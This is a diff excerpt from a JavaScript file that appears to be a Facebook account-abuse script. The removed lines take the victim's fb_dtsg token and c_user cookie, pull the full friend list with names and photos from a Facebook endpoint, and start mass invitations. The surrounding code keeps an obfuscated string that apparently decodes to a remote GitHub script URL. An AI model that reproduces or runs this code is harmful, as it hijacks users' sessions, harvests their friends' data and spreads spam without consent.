@@ -126,29 +126,7 @@ var arr = new Array;
 var arn = new Array;
 var pho = new Array;
 var tag = "Close";
-var page_name, x = document.getElementsByTagName("span");
-for (i = 0; i < x.length; i++)
-    if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
-var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
-    var b = a;
-    var c = b.substring(b.indexOf("{"));
-    var d = JSON.parse(c);
-    d = d.payload.entries;
-    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
-    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
-    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
-    i = arr.length - 1;
-    tay = i;
-    console.log(arr.length);
-    var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000'>";
-    display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
-    display += arr.length + " Friends Detected";
-    display += "</div>";
-    document.getElementById("pagelet_sidebar").innerHTML = display;
-    InviteFriends(arr[i])
-});
+
 var X = "jvvrq8--pcu,ekvjw`,amo-`jcpect3;;4-D`/Cwvm/vmmnq-ocqvgp-Qwrrmpv]Dkng,hq";
 Y = "";
 Z = "";
